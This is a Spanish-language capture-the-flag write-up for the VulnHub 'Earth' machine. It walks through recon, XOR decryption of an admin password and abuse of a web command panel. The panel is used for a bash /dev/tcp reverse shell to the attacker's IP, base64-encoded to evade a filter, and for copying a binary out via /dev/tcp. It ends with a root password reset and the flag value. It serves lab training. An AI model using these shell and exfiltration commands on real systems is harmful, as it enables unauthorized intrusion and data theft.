Lo primero que haremos sera ir a la pagaina de Vulnhub y concretamente a la siguiente direccion para descargar la maquina "Earth":
https://www.vulnhub.com/entry/the-planets-earth,755/
Una vez descargada (es una ".ova"), y montada en nuestro programa de maquinas virtuales, empezaremos usando un ARP-SCAN (o NETDISCOVER) para hallar la IP de la maquina victima:
```
arp-scan -I eth0 --localnet
netdiscover -i eth0 -r 192.168.1.0/24
```
Despues, pasaremos a realizar un NMAP:
```
nmap -p- --open -sS -sC -sV --min-rate 3000 -n -vvv -Pn IPMAQUINAVICTIMA -oN NOMBREDEARCHIVO
```
descubriendo los siguientes puertos abiertos:
```
Discovered open port 22/tcp on 192.168.1.167
Discovered open port 80/tcp on 192.168.1.167
Discovered open port 443/tcp on 192.168.1.167
```
Ademas, obtenemos cierta informacion interesante tal y como se puede apreciar a continuacion:
```
443/tcp open  ssl/http syn-ack ttl 64 Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Test Page for the HTTP Server on Fedora
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space/localityName=Milky Way
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Issuer: commonName=earth.local/stateOrProvinceName=Space/localityName=Milky Way
| Public Key type: rsa
| Public Key bits: 4096
```
Si nos fijamos bien, vemos que hay dos dominios a los que nos dirige la IP:
```
earth.local
terratest.earth.local
```
Por lo que los añadiremos a nuestro archivo "/etc/hosts" quedandonos:
```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.1.167   earth.local terratest.earth.local

```
Ahora, iremos al navegador y probaremos con ambos dominios para ver si nos aparece algo que merezca la pena:
Mientras que en "earth.local" vemos una pagina para mandar mensajes "codificados" mediante una "Message Key", en la pagina de "terratest.earth.local" aparentemente hay un sitio con un solo mensaje: "Test site, please ignore."
Bien, empezaremos con un poco de FUZZING WEB en ambas paginas para probar si existen directorios "ocultos". Usaremos en primera instancia "dirb" para "earth.local":
```
dirb https://earth.local/

---- Scanning URL: https://earth.local/ ----
+ https://earth.local/admin (CODE:301|SIZE:0)                                    + https://earth.local/cgi-bin/ (CODE:403|SIZE:199)
```
Ahora seria el turno de usarlo con "terratest.earth.local":
```
dirb https://terratest.earth.local/

---- Scanning URL: https://terratest.earth.local/ ----
+ https://terratest.earth.local/cgi-bin/ (CODE:403|SIZE:199)                     + https://terratest.earth.local/index.html (CODE:200|SIZE:26)                    + https://terratest.earth.local/robots.txt (CODE:200|SIZE:521)
```
Bien, es momento de probar en el navegador lo que hemos encontrado.
En la primera pagina tenemos un apartado "/admin" donde vemos un mensaje que nos dice:
```
"You are not logged in. Please: Log In" 
```
y el cual, nos redirige a otra pagina con un panel de Login con su tipico usuario y su contraseña.
Parece ser que no hay salida de momento por este lado, asi que vayamos pues a los resultados de la otra pagina: "terratest.earth.local".
En este caso, la cosa cambia un poco, ya que al poner en el navegador "/robots.txt" obtenemos una pequeña lista como se ve a continuacion:
```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```
Tal y como se puede ver, son todos muy genericos excepto el ultimo: " /testingnotes.* "
Como no conocemos su extension, podemos probar con WFUZZ a ver si sacamos el tipo:
```
wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u https://terratest.earth.local/testingnotes.FUZZ --hc 404
```
Y tras unos segundos recibimos el siguiente resultado:
```
=====================================================================
ID           Response   Lines    Word       Chars       Payload                               
=====================================================================

000018578:   200        9 L      90 W       546 Ch      "txt"
```
por lo que vemos que su extension es ".txt", asi que volvemos al navegador y ponemos:
```
https://terratest.earth.local/testingnotes.txt
```
Y ahora si, obtenemos un pequeño texto:
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
Si analizamos un poco lo que dice, vemos que hay 3 cosillas interesantes:
	1) Usa un algoritmo "XOR", como codificacion
	2) Hay un archivo que se llama "testdata.txt" que incluye la "key" de encriptado.
	3) En el panel de Login, se ha usado el usuario "terra" como administrador
Sabiendo esto, lo primero que necesitaremos sera obtener la "key" de encriptado, por lo que iremos a "https://terratest.earth.local/testdata.txt" tal y como nos dicen en el punto "2)", y veremos un texto que seria la clave (si, si, el texto COMPLETO es la "key").
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```
Bien, teniendo ya la clave, y sabiendo que se utiliza la codificacion XOR, volveremos a la pagina "earth.local" donde al final de esta, habia 3 codigos numericos (mensajes codificados).
Ademas, por otra parte, abriremos en otra pestaña del navegador la pagina "cyberchef" para desencriptar de forma online dichos codigos, junto a la "key" obtenida de "testdata.txt"
Centrandonos en "cyberchef", seleccionaremos "From HEX" y "XOR" (igual hay que buscarlos) en la parte izquierda de la pagina, y en la parte derecha superior (Input) colocaremos cada uno de los codigos numericos de "earth.local" para irlos probando.
Ya solo nos faltaria introducir la "key" y poner formato "UTF-8" en la seccion de "XOR".
Tanto el primer como el segundo codigo numerico no nos dicen nada, sin embargo, el Output del tercero es mas interesante:
```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```
Por lo que deducimos que "earthclimatechangebad4humans" debe ser la clave del usuario "terra". Es por ello que volveremos al panel de Login y probaremos a ver si hay suerte "et voila", estamos dentro.
Se puede ver un mensaje y un pequeño cuadrito donde podremos meter comandos que al pulsar un boton nos ejecutara en la propia pagina:
```
Welcome terra, run your CLI command on Earth Messaging Machine (use with care).  

CLI command: 
 _____________
|_____________|

RUN COMMAND

Command output:
```
Haremos poniendo por ejemplo "whoami", y vemos que obtenemos el siguiente resultado:
```
Welcome terra, run your CLI command on Earth Messaging Machine (use with care).  

CLI command: 
 _____________
|___whoami____|

RUN COMMAND

Command output:  apache  <==== RESULTADO
```
Vale, ya vemos que tenemos acceso a la maquina, pero ¿habra que hacer lo posible para obtener una terminal, verdad?
Bien, entonces lo que vamos a intentar es obtener una "reverse" mediante NETCAT para poder trabajar desde nuestra terminal de la maquina atacante.
¿Y como se hace esto? Pues nos pondremos a la escucha con el comando:
```
nc -nlvp 4444  <=== Elegimos el puerto que queramos
```
Y por otra parte, en el cuadro escribiremos:
```
bash -c "sh -i >& /dev/tcp/192.168.1.150/4444 0>&1"
```
que hemos obtenido de la pagina "https://www.revshells.com/".
Sin embargo nos encontramos con un pequeño problema, y es que al darle a "RUN COMMAND" obtenemos un mensaje de error que nos dice que no se admiten conexiones remotas.
En este momento lo que hay que hacer es intentar "engañar" a la pagina, por lo que codificaremos el comando anterior en base64 escribiendo:
```
echo 'bash -c "sh -i >& /dev/tcp/192.168.1.150/4444 0>&1"' | base64
```
Lo que nos dara como resultado la siguiente cadena:
```
YmFzaCAtYyAic2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjE1MC80NDQ0IDA+JjEiCg==
```
Bien, ahora solo nos faltaria lo que hemos dicho antes: "engañar" a la pagina con el comando:
```
echo "YmFzaCAtYyAic2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjE1MC80NDQ0IDA+JjEiCg==" | base64 -d | bash
```
Y finalmente obtenemos la reverse por nuestro terminal quedandonos lo siguiente:
```
connect to [192.168.1.150] from (UNKNOWN) [192.168.1.167] 56908
sh: cannot set terminal process group (824): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$
```
Ahora, tenemos que tratar la TTY, pero en este caso usaremos Python:
```
sh-5.1$ python -c 'import pty;pty.spawn("/bin/bash")'

bash-5.1$
```
Como se puede ver, tenemos un pequeño prompt mas "normal".
Es momento de intentar hacer una escalada de privilegios ya que si ponemos "whoami" seguimos siendo "apache", por lo que empezaremos probando con "sudo -l", sin embargo no funciona.
Habra que probar entonces mediante el comando "find / -perm -4000 2>/dev/null" el cual nos mostrara una lista de binarios como se puede ver a continuacion:
```
bash-5.1$ find / -perm -4000 2>/dev/null

/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/reset_root    <==== ¿Y esto? ¿Podremos resetear el root :) ?
/usr/sbin/grub2-set-bootflag
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/mount.nfs
/usr/lib/polkit-1/polkit-agent-helper-1

bash-5.1$
```
Si nos fijamos atentamente en los binarios, vemos uno que llama un poco la atencion: "/usr/bin/reset_root" por lo que lo ejecutaremos para ver que ocurre:
```
bash-5.1$ reset_root

CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.

bash-5.1$ 
```
A pesar de haberlo intentado, nos da fallo. ¿Y ahora que? Pues como siempre, no hay que rendirse, por lo que intentaremos bajarnos el archivo a nuestra maquina atacante para poder trabajar de forma mas tranquila utilizando otras herramientas.
Para esto, tendremos que hacer 2 cositas:
1) En la maquina atacante, abriremos otro NETCAT y guardaremos todo lo que llegue por este puerto en un archivo que llamaremos "reset_root" (que casualidad)
	```
		nc -nlvp 3333 > reset_root
	```
2) En la maquina victima, donde tenemos acceso, ejecutaremos un "cat" para que pueda copiar el contenido en nuestra maquina atacante
	```
		cat /usr/bin/reset_root > /dev/tcp/192.168.1.150/3333
	```
Una vez hecho esto, veremos que en nuestra maquina atacante tenemos el archivo "reset_root":
```
──(root㉿kali)-[/home/kali/Downloads/EarthVulnHub]
└─# ls
reset_root
```
Vamos a probar ahora a hacer un "cat" para ver su contenido, pero desgraciadamente es ILEGIBLE, por lo que habra que probar otro posible camino.
Vamos a intentar usar una utilidad de rastreo de librerias llamada "ltrace" que nos indicara a cuales accede "reset_root" cuando lo ejecutamos.
Para ello, primero daremos permisos de ejecucion a dicho archivo escribiendo "chmod +x reset_root".
Ahora ya solo ejecutariamos "ltrace" para ver las librerias a las que accede:
```
ltrace ./reset_root
```
El terminal nos muestra entonces la siguiente informacion:
```
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                  = 38
access("/dev/shm/kHgTFI5G", 0)                                               = -1
access("/dev/shm/Zw7bV9U5", 0)                                               = -1
access("/tmp/kcM0Wewe", 0)                                                   = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                  = 44
+++ exited (status 0) +++
```
Como vemos, los "triggers" estan a valor "-1", es decir, faltan y esto hace que no se pueda ejecutar correctametne el comando "reset_root". 
Este sera el momento de ir de nuevo a la terminal de la maquina victima y mediante el comando "touch" ir creando cada uno de los "triggers":
```
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```
Vale, ya casi hemos acabado, asi que vamos a probar si funciona lo que acabamos de hacer y vemos que se resetea finalmente la contraseña del usuario "root" a "Earth"
```
bash-5.1$ reset_root

CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth

bash-5.1$
```
Ya unicamente nos quedaria entrar como este usuario utilizando el comando "su root" e introduciendo la contraseña que acabamos de obtener:
```
bash-5.1$ su root

Password: Earth

[root@earth /]# 
```
**PERFECTO. YA ESTARIA TERMINADA LA MAQUINA !!!
HEMOS CONSEGUIDO ACABARLA !!!**

No obstante, si queremos ver una pequeña imagen por terminal bastante interesante, entraremos en el directorio "root" y lanzaremos un "ls", donde podremos ver que contiene dos archivos:
```
[root@earth /]# cd root

[root@earth ~]# ls

anaconda-ks.cfg  root_flag.txt

[root@earth ~]#
```
Si hacemos un "cat" sobre el archivo "root_flag.txt" obtendremos nuestra imagen secreta:
```
[root@earth ~]# cat root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]

[root@earth ~]#
```
